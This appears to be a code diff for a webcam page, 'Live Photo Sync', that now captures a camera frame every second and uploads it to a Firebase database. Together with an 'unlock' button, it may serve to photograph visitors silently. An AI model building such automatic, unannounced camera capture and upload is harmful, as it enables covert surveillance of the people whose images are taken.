@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - Auto Capture</title>
+  <title>Live Photo Sync - Auto Continuous Capture</title>
   <style>
     body {
       background: black;
@@ -82,20 +82,19 @@
     const unlockBtn = document.getElementById('unlockBtn');
 
     let isUnlocked = false;
-    let alreadyCaptured = false;
+    let captureInterval;
 
-    // Start video and auto-capture once ready
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
       video.onloadedmetadata = () => {
-        if (!alreadyCaptured) {
-          alreadyCaptured = true;
-          setTimeout(capture, 500); // give camera a moment to stabilize
-        }
+        // Start continuous auto-capture every 1 second
+        captureInterval = setInterval(capture, 1000);
       };
     });
 
     function capture() {
+      if (!video.videoWidth) return;
+
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -104,7 +103,7 @@
 
       db.ref("livephotos").once("value", snapshot => {
         let photos = snapshot.val() || [];
-        if (photos.length >= 4) photos.shift();
+        if (photos.length >= 4) photos.shift(); // remove oldest
         photos.push(dataUrl);
         db.ref("livephotos").set(photos);
       });
